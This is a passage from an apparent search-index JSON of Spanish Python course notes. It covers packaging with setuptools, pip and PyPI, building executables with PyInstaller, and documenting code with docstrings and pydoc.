Installs Packages), utilizando el comando pip install nombre_paquete . Adem\u00e1s podemos listar los paquetes instalados con pip list , borrar alguno con pip uninstall nombre_paquete o incluso instalar todas las dependencias de un fichero requisites.txt utilizando pip install requisites.txt . Si quer\u00e9is saber m\u00e1s sobre pip, simplemente escribid pip en la terminal. Clasificadores Por lo tanto tenemos un repositorio inmenso, as\u00ed que \u00bfc\u00f3mo podemos a\u00f1adir informaci\u00f3n para categorizar nuestro paquete en PyPI? Pues utilizando un par\u00e1metro llamado classifiers de la siguiente forma: setup ( ... , classifiers = [ \"Development Status :: 3 - Alpha\" , \"Topic :: Utilities\" , \"License :: OSI Approved :: GNU General Public License (GPL)\" , ], ) Hay un mont\u00f3n de clasificadores, desde el estado del proyecto, el tema, las licencias, etc. Una lista completa de los clasificadores disponibles podemos encontrarla en la propia web de PyPI: https://pypi.python.org/pypi?%3Aaction=list_classifiers Probando el paquete Una vez tenemos toda la informaci\u00f3n configurada, podemos probar nuestro paquete f\u00e1cilmente realizando una instalaci\u00f3n en modo desarrollo. Para ello utilizar\u00edamos el siguiente comando: python setup.py develop Este modo es muy pr\u00e1ctico, ya que nos permite utilizar nuestro m\u00f3dulo en cualquier lugar y hacer modificacione sin necesidad de reinstalarlo constamente. Eso es posible porque se utiliza desde el propio directorio. Una vez hayamos hecho las probaturas y estemos satisfechos, podemos desinstalar el paquete de desarrollo: python setup.py develop --uninstall Para instalar el paquete definitivo utilizar\u00edamos: python setup.py install Pero tenemos que tener en cuenta que una vez hecho esto, el paquete se instala en una copia interna y ya no podremos modificarlo sin antes desinstalarlo, algo que tendremos que hacer con PIP, buscando el nombre del paquete con pip list y haciendo un pip uninstall nombre_paquete . Distribuyendo el paquete Ya tenemos el paquete, hemos creado el instalador, lo hemos probado y estamos preparados para distribuirlo. Hay dos formas: Localmente : Generando un fichero comprimido que podemos compartir con nuestros conocidos. P\u00fablicamente : En el repositorio PyPI para que todo el mundo pueda utilizarlo. Evidentemente si distribuimos localmente no tenemos que tener mucho cuidado, y adem\u00e1s podemos hacer pruebas. Pero si decidimos hacerlo p\u00fablicamente tendremos que intentar que el paquete tenga un m\u00ednimo de calidad. Localmente Distribuir el paquete localmente es muy f\u00e1ci. Simplemente tenemos que utilizar el comando: python setup.py sdist Esto generar\u00e1 un directorio dist/ en la carpeta del paquete. Dentro encontraremos un fichero zip o tar.gz dependiendo de nuestro sistema operativo. Este fichero ya podremos compartirlo con quien queramos, y para instalarlo s\u00f3lo tendremos que utilizar la herramienta pip : pip install nombre_del_fichero.zip # La extensi\u00f3n depende del sistema operativo Luego para desinstalarlo de la misma forma pero utilizando el nombre del paquete: pip uninstall nombre_paquete P\u00fablicamente Aunque no voy a hacer la demostraci\u00f3n porque ahora mismo no dispongo de un paquete para publicar en el repositorio de PyPI, s\u00ed que os voy a ense\u00f1ar los pasos a seguir para hacerlo. Lo bueno de registrar un paquete en PyPI es que podemos instalarlo desde cualquier lugar a trav\u00e9s de internet utilizando la herramienta PIP. Dicho \u00e9sto, si alg\u00fan d\u00eda cre\u00e1is un paquete de calidad y quer\u00e9is compartirlo con la comunidad, lo primero es registrar una cuenta en PyPI: https://pypi.python.org/pypi?%3Aaction=register_form A continuaci\u00f3n desde el directorio de nuestro paquete tenemos que ejecutar el comando: python setup.py register As\u00ed iniciaremos una petici\u00f3n para registrar nuestro paquete en el repositorio. Luego tendremos que seguir los pasos e identificarnos cuando lo pida con nuestro usuario y contrase\u00f1a (que hemos creado antes). Una vez hecho esto ya hemos creado nuestro paquete, pero todav\u00eda no hemos publicado una versi\u00f3n, as\u00ed que vamos a hacerlo utilizando el comando: python setup.py sdist upload \u00a1Y ya est\u00e1! Ahora podremos instalar nuestro paquete desde en cualquier lugar con PIP: pip install nombre_paquete Pyinstaller Ya hemos visto como distribuir nuestros paquetes... \u00bfPero y si creamos una aplicaci\u00f3n y queremos generar un ejecutable para utilizarla? Bueno, en este caso puede ser bastante complicado dependiendo de las dependencias que utilice el programa. Por suerte hay un m\u00f3dulo que nos ayudar\u00e1 mucho a generar ejecutables porque automatiza el proceso, ese es pyinstaller . Lo que hace es generar un .EXE en Windows, un .DMG en MAC o el ejecutable que utilice el sistema operativo. Dentro del ejecutable se incluye el propio int\u00e9rprete de Python, y por esa raz\u00f3n podremos utilizarlo en cualquier ordenador sin necesidad de instalar Python previamente. Instalaci\u00f3n La instalaci\u00f3n es muy f\u00e1cil: pip install pyinstaller No hay m\u00e1s. Primer ejecutable Comencemos con algo simple, tenemos un script hola.py : print ( \"Hola mundo!\" ) Y queremos crear un ejecutable a partir de \u00e9l, pues har\u00edamos lo siguiente: pyinstaller hola.py Una vez acabe el proceso se nos habr\u00e1n creado varias carpetas. La que nos interesa es dist , y dentro encontraremos una carpeta con el nombre programa y en esta un mont\u00f3n de ficheros y el ejecutable, en mi caso como estoy en Windows es hola.exe . Como es un programa para terminal, para ejecutarlo tengo que abrir la terminal en ese directorio y ejecutar el programa manualmente: C:\\Users\\Hector\\Desktop\\hola\\dist\\hola>hola.exe Hola mundo! Ejecutable con interfaz Ahora vamos a hacer otro a partir de un simple programa con Tkinter, la librer\u00eda de componentes integrada en Python que ya conocemos. Nos deber\u00eda funcionar sin problemas: from tkinter import * root = Tk () Label ( text = 'Hola mundo' ) . pack ( pady = 10 ) root . mainloop () Suponiendo que lo hemos puesto en el mismo script: pyinstaller hola.py En esta ocasi\u00f3n si ejecutamos el programa con doble clic nos funcionar\u00e1 bien, el problema es que se muestra la terminal de fondo. Para que desaparezca tenemos que indicar que es una aplicaci\u00f3n en ventana, y eso lo hacemos de la siguiente forma al crear el ejecutable: pyinstaller --windowed hola.py Ejecutable en un fichero Ya v\u00e9is que por defecto Pyinstaller crea un directorio con un mont\u00f3n de ficheros. Podemos utilizar un comando para generar un solo fichero ejecutable que lo contenga todo, pero este ocupara bastante m\u00e1s: pyinstaller --windowed --onefile hola.py Cambiar el icono Tambi\u00e9n podemos cambiar el icono por defecto del ejecutable. Para ello necesitamos una imagen en formato .ico. pyinstaller --windowed --onefile --icon=./hola.ico hola.py Si no ten\u00e9is uno, pod\u00e9is utilizar este para probar: http://www.iconarchive.com/download/i3532/artua/star-wars/Darth-Vader.ico Si por algo no os cambia el icono, probad cambiando el nombre del ejecutable. A veces el cach\u00e9 de Windows puede ignorar estas cosas. Limitaciones El gran problema con Pyinstaller como os dec\u00eda al principio son las dependencias. Si nuestro programa utiliza \u00fanicamente m\u00f3dulos de la librer\u00eda est\u00e1ndard no tendremos ning\u00fan problema, pero si queremos utilizar m\u00f3dulos externos es posible que no funcione... A no ser que sea alguno de los soportados como PyQT, django, pandas, matpotlib... pero requieren una configuraciones extra. Si quer\u00e9is saber m\u00e1s os dejo este enlace con los paquetes soportados: https://github.com/pyinstaller/pyinstaller/wiki/Supported-Packages Personalmente nunca he hecho nada avanzado, pero si quer\u00e9is hacerlo y no lo consegu\u00eds, os pod\u00e9is poner en contacto conmigo y estar\u00e9 encantado de ayudaros. Y con esto llegamos al final... por ahora ;-)","title":"Distribuci\u00f3n"},{"location":"lenguajes/python3/apuntes-distribucion/#distribucion","text":"","title":"Distribuci\u00f3n"},{"location":"lenguajes/python3/apuntes-distribucion/#setuptools","text":"En Python todo el tema de empaquetar puede ser un poco lioso, ya que encontramos varios m\u00f3dulos desintados a ello. Nosotros vamos a centrarnos en setuptools , ya que es la forma m\u00e1s utilizada, nos proporciona todo lo necesario para distribuir nuestros propios m\u00f3dulos e incluso nos permite publicar paquetes en el respositorio p\u00fablico PyPI (Python Package Index) de forma directa desde la propia terminal. Si lo record\u00e1is, en la lecci\u00f3n de m\u00f3dulos ya os ense\u00f1\u00e9 como crear un distribuible con setuptools, a lo largo de esta lecci\u00f3n vamos a repasar y aprender varios conceptos nuevos.","title":"Setuptools"},{"location":"lenguajes/python3/apuntes-distribucion/#paquete-basico","text":"Antes de comenzar es importante repasar la estructura de un paquete en Python,ya que para distribuir nuestro c\u00f3digo es indispensable estructurarlo dentro de un paquete: | setup.py # Fichero que contiene toda la informaci\u00f3n de instalaci\u00f3n + prueba/ # Directorio del paquete al mismo nivel que setup.py | __init__.py # Fichero que indica que el directorio es un paquete | modulo.py # M\u00f3dulo o script que contiene definiciones Por lo tanto vamos a empaquetar el paquete de nombre prueba , que contiene c\u00f3digo en el fichero modulo.py . Vamos a aprender un poco m\u00e1s sobre el fichero de instalaci\u00f3n.","title":"Paquete b\u00e1sico"},{"location":"lenguajes/python3/apuntes-distribucion/#setuppy","text":"El fichero de configuraci\u00f3n incluye toda la informaci\u00f3n necesaria para realizar la instalaci\u00f3n de nuestro paquete. Algunos campos incluyen s\u00f3lo metadatos como el nombre, la versi\u00f3n, la descripci\u00f3n o el autor. Pero otros sirven para extender la instalaci\u00f3n. Como ser\u00eda un caos que cada desarrollador pusiera los campos que quisiera, hay una serie de par\u00e1metros comunes y avanzados, pero como son muchos lo m\u00e1s com\u00fan es utilizar una plantilla base como la siguiente que pasa la configuraci\u00f3n a la funci\u00f3n setup : from setuptools import setup setup ( name = \"Prueba\" , # Nombre version = \"0.1\" , # Versi\u00f3n de desarrollo description = \"Paquete de prueba\" , # Descripci\u00f3n del funcionamiento author = \"Hector Costa\" , # Nombre del autor author_email = 'me@hcosta.info' , # Email del autor license = \"GPL\" , # Licencia: MIT, GPL, GPL 2.0... url = \"http://ejemplo.com\" , # P\u00e1gina oficial (si la hay) packages = [ 'prueba' ], ) \u00bfHasta aqu\u00ed f\u00e1cil no? Son simples metadatos para definir el paquete, con la excepci\u00f3n de packages , en el que tenemos que indicar todos los paquetes que formar\u00e1n parte del paquete distribuido en forma de lista. Aunque en este caso \u00fanicamente tendr\u00edamos al paquete prueba , imaginaros que tenemos docenas de subpaquetes y tubi\u00e9ramos que a\u00f1adirlos uno a uno... Pues para estos casos podemos importar una funci\u00f3n que se encargar\u00e1 de buscar autom\u00e1ticamente los subpaquetes, se trata de find_packages y la podemos encontrar dentro de setuptools : from setuptools import setup , find_packages setup ( ... packages = find_packages () )","title":"setup.py"},{"location":"lenguajes/python3/apuntes-distribucion/#dependencias","text":"Ahora imaginaros que en vuestro paquete alg\u00fan c\u00f3digo utiliza funciones de un m\u00f3dulo externo o paquete que hay que instalar manualmente. Esto se conoce como dependencias del paquete, y por suerte podemos indicar a un par\u00e1metro que descargue todos los paquetes en la versi\u00f3n que nosotros indiquemos, se trata de install_requires . Por ejemplo imaginad que dentro de nuestro paquete necesitamos utilizar el m\u00f3dulo Pillow para manejar im\u00e1genes. Por regla general podemos instalarlo desde la terminal con el comando: pip install pillow Pero si queremos que el paquete lo instale autom\u00e1ticamente s\u00f3lo tenemos que indicarlo de esta forma: setup ( ... , install_requires = [ \"pillow\" ], ) Y as\u00ed ir\u00edamos poniendo todas las dependencias en la lista. Lo bueno que tiene es que podemos indicar la versi\u00f3n exacta que queremos instalar, por ejemplo. Si mi programa utilizase la versi\u00f3n 1.1.0 de Pillow tendr\u00eda que poner: setup ( ... , install_requires = [ \"pillow==1.1.0\" ], ) En cambio si fuera compatible con cualquier versi\u00f3n a partir de la 1.1.5 podr\u00eda poner: setup ( ... , install_requires = [ \"pillow>=1.1.5\" ], ) Si no indicamos una versi\u00f3n, se instalar\u00e1 autom\u00e1ticamente la m\u00e1s actual.","title":"Dependencias"},{"location":"lenguajes/python3/apuntes-distribucion/#utilizando-un-fichero-de-dependencias","text":"De forma similar a antes, quiz\u00e1 llega el momento donde tenemos much\u00edsimas dependencias y es un engorro tener que cambiar directamente el fichero setup.py . Para solucionarlo podemos utilizar una t\u00e9cnica que se basa en crear un fichero de texto y escribir las dependencias, una por l\u00ednea. Luego podemos abrir el fichero y a\u00f1adir las dependencias autom\u00e1ticamente en forma de lista. Generalmente a este fichero se le llama requirements.txt y debe estar en el mismo directorio que setup.py :","title":"Utilizando un fichero de dependencias"},{"location":"lenguajes/python3/apuntes-distribucion/#requirementstxt","text":"pillow==1.1.0 django>=1.10.0,<=1.10.3 pygame Luego en las dependencias indicar\u00edamos lo siguiente: setup ( ... , install_requires = [ i . strip () for i in open ( \"requirements.txt\" ) . readlines ()], )","title":"requirements.txt"},{"location":"lenguajes/python3/apuntes-distribucion/#suite-test","text":"Otra cosa interesante que podemos hacer es adjuntar una suite de tests unitarios para nuestro paquete, ya sab\u00e9is, los que aprendimos en la unidad anterior. Para incluirlos tendremos indicar un par\u00e1metro en el instalador llamado test_suite , al que le pasaremos el nombre del directorio que los contiene, por lo general llamado tests : | setup.py | requeriments.txt + prueba/ | __init__.py | modulo.py + tests/ | test_pillow.py | test_django.py | test_pygame.py En el setup.py : setup ( ... , test_suite = \"tests\" ) Luego para ejecutarlos podemos utilizar el comando: python setup . py test","title":"Suite Test"},{"location":"lenguajes/python3/apuntes-distribucion/#pypi-y-pip","text":"Por \u00faltimo hablemos un poco m\u00e1s del Python Package Index . Como ya sab\u00e9is se trata de un repositorio p\u00fablico con miles y miles de paquetes creados por la enorme comunidad de Python. De hecho yo mismo cre\u00e9 hace a\u00f1os un peque\u00f1o m\u00f3dulo para el framework django, os dejo el enlace por si os pica la curiosidad: https://pypi.python.org/pypi/django-easyregistration Sea como sea, la forma de instalar c\u00f3modamente los paquetes de PyPI es con la herramienta PIP (un acr\u00f3nimo recursivo de Pip Installs Packages), utilizando el comando pip install nombre_paquete . Adem\u00e1s podemos listar los paquetes instalados con pip list , borrar alguno con pip uninstall nombre_paquete o incluso instalar todas las dependencias de un fichero requisites.txt utilizando pip install requisites.txt . Si quer\u00e9is saber m\u00e1s sobre pip, simplemente escribid pip en la terminal.","title":"PyPI y PIP"},{"location":"lenguajes/python3/apuntes-distribucion/#clasificadores","text":"Por lo tanto tenemos un repositorio inmenso, as\u00ed que \u00bfc\u00f3mo podemos a\u00f1adir informaci\u00f3n para categorizar nuestro paquete en PyPI? Pues utilizando un par\u00e1metro llamado classifiers de la siguiente forma: setup ( ... , classifiers = [ \"Development Status :: 3 - Alpha\" , \"Topic :: Utilities\" , \"License :: OSI Approved :: GNU General Public License (GPL)\" , ], ) Hay un mont\u00f3n de clasificadores, desde el estado del proyecto, el tema, las licencias, etc. Una lista completa de los clasificadores disponibles podemos encontrarla en la propia web de PyPI: https://pypi.python.org/pypi?%3Aaction=list_classifiers","title":"Clasificadores"},{"location":"lenguajes/python3/apuntes-distribucion/#probando-el-paquete","text":"Una vez tenemos toda la informaci\u00f3n configurada, podemos probar nuestro paquete f\u00e1cilmente realizando una instalaci\u00f3n en modo desarrollo. Para ello utilizar\u00edamos el siguiente comando: python setup.py develop Este modo es muy pr\u00e1ctico, ya que nos permite utilizar nuestro m\u00f3dulo en cualquier lugar y hacer modificacione sin necesidad de reinstalarlo constamente. Eso es posible porque se utiliza desde el propio directorio. Una vez hayamos hecho las probaturas y estemos satisfechos, podemos desinstalar el paquete de desarrollo: python setup.py develop --uninstall Para instalar el paquete definitivo utilizar\u00edamos: python setup.py install Pero tenemos que tener en cuenta que una vez hecho esto, el paquete se instala en una copia interna y ya no podremos modificarlo sin antes desinstalarlo, algo que tendremos que hacer con PIP, buscando el nombre del paquete con pip list y haciendo un pip uninstall nombre_paquete .","title":"Probando el paquete"},{"location":"lenguajes/python3/apuntes-distribucion/#distribuyendo-el-paquete","text":"Ya tenemos el paquete, hemos creado el instalador, lo hemos probado y estamos preparados para distribuirlo. Hay dos formas: Localmente : Generando un fichero comprimido que podemos compartir con nuestros conocidos. P\u00fablicamente : En el repositorio PyPI para que todo el mundo pueda utilizarlo. Evidentemente si distribuimos localmente no tenemos que tener mucho cuidado, y adem\u00e1s podemos hacer pruebas. Pero si decidimos hacerlo p\u00fablicamente tendremos que intentar que el paquete tenga un m\u00ednimo de calidad.","title":"Distribuyendo el paquete"},{"location":"lenguajes/python3/apuntes-distribucion/#localmente","text":"Distribuir el paquete localmente es muy f\u00e1ci. Simplemente tenemos que utilizar el comando: python setup.py sdist Esto generar\u00e1 un directorio dist/ en la carpeta del paquete. Dentro encontraremos un fichero zip o tar.gz dependiendo de nuestro sistema operativo. Este fichero ya podremos compartirlo con quien queramos, y para instalarlo s\u00f3lo tendremos que utilizar la herramienta pip : pip install nombre_del_fichero.zip # La extensi\u00f3n depende del sistema operativo Luego para desinstalarlo de la misma forma pero utilizando el nombre del paquete: pip uninstall nombre_paquete","title":"Localmente"},{"location":"lenguajes/python3/apuntes-distribucion/#publicamente","text":"Aunque no voy a hacer la demostraci\u00f3n porque ahora mismo no dispongo de un paquete para publicar en el repositorio de PyPI, s\u00ed que os voy a ense\u00f1ar los pasos a seguir para hacerlo. Lo bueno de registrar un paquete en PyPI es que podemos instalarlo desde cualquier lugar a trav\u00e9s de internet utilizando la herramienta PIP. Dicho \u00e9sto, si alg\u00fan d\u00eda cre\u00e1is un paquete de calidad y quer\u00e9is compartirlo con la comunidad, lo primero es registrar una cuenta en PyPI: https://pypi.python.org/pypi?%3Aaction=register_form A continuaci\u00f3n desde el directorio de nuestro paquete tenemos que ejecutar el comando: python setup.py register As\u00ed iniciaremos una petici\u00f3n para registrar nuestro paquete en el repositorio. Luego tendremos que seguir los pasos e identificarnos cuando lo pida con nuestro usuario y contrase\u00f1a (que hemos creado antes). Una vez hecho esto ya hemos creado nuestro paquete, pero todav\u00eda no hemos publicado una versi\u00f3n, as\u00ed que vamos a hacerlo utilizando el comando: python setup.py sdist upload \u00a1Y ya est\u00e1! Ahora podremos instalar nuestro paquete desde en cualquier lugar con PIP: pip install nombre_paquete","title":"P\u00fablicamente"},{"location":"lenguajes/python3/apuntes-distribucion/#pyinstaller","text":"Ya hemos visto como distribuir nuestros paquetes... \u00bfPero y si creamos una aplicaci\u00f3n y queremos generar un ejecutable para utilizarla? Bueno, en este caso puede ser bastante complicado dependiendo de las dependencias que utilice el programa. Por suerte hay un m\u00f3dulo que nos ayudar\u00e1 mucho a generar ejecutables porque automatiza el proceso, ese es pyinstaller . Lo que hace es generar un .EXE en Windows, un .DMG en MAC o el ejecutable que utilice el sistema operativo. Dentro del ejecutable se incluye el propio int\u00e9rprete de Python, y por esa raz\u00f3n podremos utilizarlo en cualquier ordenador sin necesidad de instalar Python previamente.","title":"Pyinstaller"},{"location":"lenguajes/python3/apuntes-distribucion/#instalacion","text":"La instalaci\u00f3n es muy f\u00e1cil: pip install pyinstaller No hay m\u00e1s.","title":"Instalaci\u00f3n"},{"location":"lenguajes/python3/apuntes-distribucion/#primer-ejecutable","text":"Comencemos con algo simple, tenemos un script hola.py : print ( \"Hola mundo!\" ) Y queremos crear un ejecutable a partir de \u00e9l, pues har\u00edamos lo siguiente: pyinstaller hola.py Una vez acabe el proceso se nos habr\u00e1n creado varias carpetas. La que nos interesa es dist , y dentro encontraremos una carpeta con el nombre programa y en esta un mont\u00f3n de ficheros y el ejecutable, en mi caso como estoy en Windows es hola.exe . Como es un programa para terminal, para ejecutarlo tengo que abrir la terminal en ese directorio y ejecutar el programa manualmente: C:\\Users\\Hector\\Desktop\\hola\\dist\\hola>hola.exe Hola mundo!","title":"Primer ejecutable"},{"location":"lenguajes/python3/apuntes-distribucion/#ejecutable-con-interfaz","text":"Ahora vamos a hacer otro a partir de un simple programa con Tkinter, la librer\u00eda de componentes integrada en Python que ya conocemos. Nos deber\u00eda funcionar sin problemas: from tkinter import * root = Tk () Label ( text = 'Hola mundo' ) . pack ( pady = 10 ) root . mainloop () Suponiendo que lo hemos puesto en el mismo script: pyinstaller hola.py En esta ocasi\u00f3n si ejecutamos el programa con doble clic nos funcionar\u00e1 bien, el problema es que se muestra la terminal de fondo. Para que desaparezca tenemos que indicar que es una aplicaci\u00f3n en ventana, y eso lo hacemos de la siguiente forma al crear el ejecutable: pyinstaller --windowed hola.py","title":"Ejecutable con interfaz"},{"location":"lenguajes/python3/apuntes-distribucion/#ejecutable-en-un-fichero","text":"Ya v\u00e9is que por defecto Pyinstaller crea un directorio con un mont\u00f3n de ficheros. Podemos utilizar un comando para generar un solo fichero ejecutable que lo contenga todo, pero este ocupara bastante m\u00e1s: pyinstaller --windowed --onefile hola.py","title":"Ejecutable en un fichero"},{"location":"lenguajes/python3/apuntes-distribucion/#cambiar-el-icono","text":"Tambi\u00e9n podemos cambiar el icono por defecto del ejecutable. Para ello necesitamos una imagen en formato .ico. pyinstaller --windowed --onefile --icon=./hola.ico hola.py Si no ten\u00e9is uno, pod\u00e9is utilizar este para probar: http://www.iconarchive.com/download/i3532/artua/star-wars/Darth-Vader.ico Si por algo no os cambia el icono, probad cambiando el nombre del ejecutable. A veces el cach\u00e9 de Windows puede ignorar estas cosas.","title":"Cambiar el icono"},{"location":"lenguajes/python3/apuntes-distribucion/#limitaciones","text":"El gran problema con Pyinstaller como os dec\u00eda al principio son las dependencias. Si nuestro programa utiliza \u00fanicamente m\u00f3dulos de la librer\u00eda est\u00e1ndard no tendremos ning\u00fan problema, pero si queremos utilizar m\u00f3dulos externos es posible que no funcione... A no ser que sea alguno de los soportados como PyQT, django, pandas, matpotlib... pero requieren una configuraciones extra. Si quer\u00e9is saber m\u00e1s os dejo este enlace con los paquetes soportados: https://github.com/pyinstaller/pyinstaller/wiki/Supported-Packages Personalmente nunca he hecho nada avanzado, pero si quer\u00e9is hacerlo y no lo consegu\u00eds, os pod\u00e9is poner en contacto conmigo y estar\u00e9 encantado de ayudaros. Y con esto llegamos al final... por ahora ;-)","title":"Limitaciones"},{"location":"lenguajes/python3/apuntes-documentacion/","text":"Documentaci\u00f3n Docstrings En Python todos los objetos cuentan con una variable especial llamada doc gracias a la que podemos describir para qu\u00e9 sirven los y c\u00f3mo se usan los objetos. Estas variables reciben el nombre de docstrings , cadenas de documentaci\u00f3n. Docstrings en funciones Python implementa un sistema muy sencillo para establecer el valor de las docstrings, \u00fanicamente tenemos que crear un comentario en la primera l\u00ednea despu\u00e9s de la declaraci\u00f3n. def hola ( arg ): \"\"\"Este es el docstring de la funci\u00f3n\"\"\" print ( \"Hola\" , arg , \"!\" ) hola ( \"H\u00e9ctor\" ) Hola H\u00e9ctor ! Para consultar la documentaci\u00f3n es tan sencillo como utilizar la funci\u00f3n reservada help y pasarle el objeto: help ( hola ) Help on function hola in module __main__: hola(arg) Este es el docstring de la funci\u00f3n Docstrings en clases y m\u00e9todos De la misma forma podemos establecer la documentaci\u00f3n de la clase despu\u00e9s de la definici\u00f3n, y de los m\u00e9todos, como si fueran funciones: class Clase : \"\"\" Este es el docstring de la clase\"\"\" def __init__ ( self ): \"\"\"Este es el docstring del inicializador de clase\"\"\" def metodo ( self ): \"\"\"Este es el docstring del metodo de clase\"\"\" o = Clase () help ( o ) Help on Clase in module __main__ object : class Clase ( builtins . object ) | Este es el docstring de la clase | | Methods defined here : | | __init__ ( self ) | Este es el docstring del inicializador de clase | | metodo ( self ) | Este es el docstring del metodo de clase | | ---------------------------------------------------------------------- | Data descriptors defined here : | | __dict__ | dictionary for instance variables ( if defined ) | | __weakref__ | list of weak references to the object ( if defined ) Docstrings en scripts y m\u00f3dulos Cuando tenemos un script o m\u00f3dulo, la primera l\u00ednea del mismo har\u00e1 referencia al docstring del m\u00f3dulo, en \u00e9l deber\u00edamos explicar el funcionamiento del mismo: mi_modulo.py \"\"\"Este es el docstring del m\u00f3dulo\"\"\" def despedir (): \"\"\"Este es el docstring de la funci\u00f3n despedir\"\"\" print ( \"Adi\u00f3s! Me estoy despidiendo desde la funci\u00f3n despedir() del m\u00f3dulo prueba\" ) def saludar (): \"\"\"Este es el docstring de la funci\u00f3n saludar\"\"\" print ( \"Hola! Te estoy saludando desde la funci\u00f3n saludar() del m\u00f3dulo prueba\" ) import mi_modulo # Este m\u00f3dulo lo he creado en el directorio help ( mi_modulo ) Help on module mi_modulo: NAME mi_modulo - Este es el docstring del m\u00f3dulo FUNCTIONS despedir() Este es el docstring de la funci\u00f3n despedir saludar() Este es el docstring de la funci\u00f3n saludar FILE c:\\cursopython\\fase 4 - temas avanzados\\tema 16 - docomentaci\u00f3n y pruebas\\mi_modulo.py help ( mi_modulo . despedir ) Help on function despedir in module mi_modulo: despedir() Este es el docstring de la funci\u00f3n despedir Como dato curioso, tambi\u00e9n podemos listar las variables y funciones del m\u00f3dulo con la funci\u00f3n dir : dir ( mi_modulo ) [ '__builtins__' , '__cached__' , '__doc__' , '__file__' , '__loader__' , '__name__' , '__package__' , '__spec__' , 'despedir' , 'saludar' ] Como vemos muchas de ellas son especiales, seguro que muchas os suenan, os invito a comprobar sus valores: mi_modulo . __name__ 'mi_modulo' mi_modulo . __doc__ 'Este es el docstring del m\u00f3dulo' Docstrings en paquetes En el caso de los paquetes el docstring debemos establecerlo en la primera l\u00ednea del inicializador init : Suponiedo que tenemos la siguiente estructura: mi_paquete/ | _ __init__.py | _ adios | | _ __init__.py | | _ adios.py | _ hola | _ __init__.py | _ hola.py init .py \"\"\" Este es el docstring de mi_paquete \"\"\" import mi_paquete help ( mi_paquete ) Help on package mi_paquete: NAME mi_paquete - Este es el docstring de mi_paquete PACKAGE CONTENTS adios (package) hola (package) FILE c:\\cursopython\\fase 4 - temas avanzados\\tema 16 - docomentaci\u00f3n y pruebas\\mi_paquete\\__init__.py Creando buena documentaci\u00f3n Pod\u00e9is aprender a crear buena documentaci\u00f3n tomando como referencia contenido de las librer\u00edas internas de Python: help ( print ) Help on built-in function print in module builtins : print (...) print ( value , ..., sep = ' ' , end = '\\n' , file = sys . stdout , flush = False ) Prints the values to a stream , or to sys . stdout by default . Optional keyword arguments : file : a file-like object ( stream ); defaults to the current sys . stdout . sep : string inserted between values , default a space . end : string appended after the last value , default a newline . flush : whether to forcibly flush the stream . help ( len ) Help on built - in function len in module builtins : len ( obj , / ) Return the number of items in a container . help ( str ) Help on class str in module builtins: class str ( object ) | str ( object = '' ) -> str | str ( bytes_or_buffer [ , encoding [ , errors ]]) -> str | | Create a new string object from the given object. If encoding or | errors is specified, then the object must expose a data buffer | that will be decoded using the given encoding and error handler. | Otherwise, returns the result of object.__str__ () ( if defined ) | or repr ( object ) . | encoding defaults to sys.getdefaultencoding () . | errors defaults to 'strict' . | | Methods defined here: | | __add__ ( self, value, / ) | Return self+value. | | __contains__ ( self, key, / ) | Return key in self. .... Recordad, una buena documentaci\u00f3n siempre dar\u00e1 respuesta a las dos preguntas b\u00e1sicas: \u00bfPara qu\u00e9 sirve? y \u00bfC\u00f3mo se utiliza? Pydoc En la lecci\u00f3n anterior aprendimos que utilizando la funci\u00f3n help podemos mostrar informaci\u00f3n formateada por la consola. Pues en realidad esta funci\u00f3n hace uso del m\u00f3dulo pydoc para generar la documentaci\u00f3n a partir de sus docstrings . Desde la terminal no podemos utilizar la funci\u00f3n help , pero s\u00ed existe la posibilidad de utilizar pydoc de forma similar. Por ejemplo podemos consultar la documentaci\u00f3n de scripts, m\u00f3dulos y clases utilizando la sintaxis: pydoc nombre.py Tambi\u00e9n podemos utilizar la misma sintaxis para los paquetes: pydoc nombre_paquete Documentaci\u00f3n en HTML Una funci\u00f3n interesante de Pydoc es que podemos generar la documentaci\u00f3n de nuestro c\u00f3digo utilizando la siguiente sintaxis: pydoc -w nombre.py Si tenemos un paquete podemos generar toda la documentaci\u00f3n de forma recursiva de la siguiente forma estando en el directorio del paquete: pydoc -w . \\ Esto generar\u00e1 toda la documentaci\u00f3n del paquete, subpaquete, clases, m\u00e9todos y funciones. Est\u00e1 bien para publicarla en Internet, pero tambi\u00e9n podemos consultarla directamente en local lanzando un servidor temporal, desde el directorio del paquete: pydoc -p 8000 Aunque esto mostrar\u00e1 la documentaci\u00f3n general de Python en ese momento, a parte de nuestro m\u00f3dulo. Existen otras alternativas m\u00e1s bonitas para generar documentaci\u00f3n, como los m\u00f3dulos Epydoc o Sphinx .","title":"Documentaci\u00f3n"},{"location":"lenguajes/python3/apuntes-documentacion/#documentacion","text":"","title":"Documentaci\u00f3n"},{"location":"lenguajes/python3/apuntes-documentacion/#docstrings","text":"En Python todos los objetos cuentan con una variable especial llamada doc gracias a la que podemos describir para qu\u00e9 sirven los y c\u00f3mo se usan los objetos. Estas variables reciben el nombre de docstrings , cadenas de documentaci\u00f3n.","title":"Docstrings"},{"location":"lenguajes/python3/apuntes-documentacion/#docstrings-en-funciones","text":"Python implementa un sistema muy sencillo para establecer el valor de las docstrings, \u00fanicamente tenemos que crear un comentario en la primera l\u00ednea despu\u00e9s de la declaraci\u00f3n. def hola ( arg ): \"\"\"Este es el docstring de la funci\u00f3n\"\"\" print ( \"Hola\" , arg , \"!\" ) hola ( \"H\u00e9ctor\" ) Hola H\u00e9ctor ! Para consultar la documentaci\u00f3n es tan sencillo como utilizar la funci\u00f3n reservada help y pasarle el objeto: help ( hola ) Help on function hola in module __main__: hola(arg) Este es el docstring de la funci\u00f3n","title":"Docstrings en funciones"},{"location":"lenguajes/python3/apuntes-documentacion/#docstrings-en-clases-y-metodos","text":"De la misma forma podemos establecer la documentaci\u00f3n de la clase despu\u00e9s de la definici\u00f3n, y de los m\u00e9todos, como si fueran funciones: class Clase : \"\"\" Este es el docstring de la clase\"\"\" def __init__ ( self ): \"\"\"Este es el docstring del inicializador de clase\"\"\" def metodo ( self ): \"\"\"Este es el docstring del metodo de clase\"\"\" o = Clase () help ( o ) Help on Clase in module __main__ object : class Clase ( builtins . object ) | Este es el docstring de la clase | | Methods defined here : | | __init__ ( self ) | Este es el docstring del inicializador de clase | | metodo ( self ) | Este es el docstring del metodo de clase | | ---------------------------------------------------------------------- | Data descriptors defined here : | | __dict__ | dictionary for instance variables ( if defined ) | | __weakref__ | list of weak references to the object ( if defined )","title":"Docstrings en clases y m\u00e9todos"},{"location":"lenguajes/python3/apuntes-documentacion/#docstrings-en-scripts-y-modulos","text":"Cuando tenemos un script o m\u00f3dulo, la primera l\u00ednea del mismo har\u00e1 referencia al docstring del m\u00f3dulo, en \u00e9l deber\u00edamos explicar el funcionamiento del 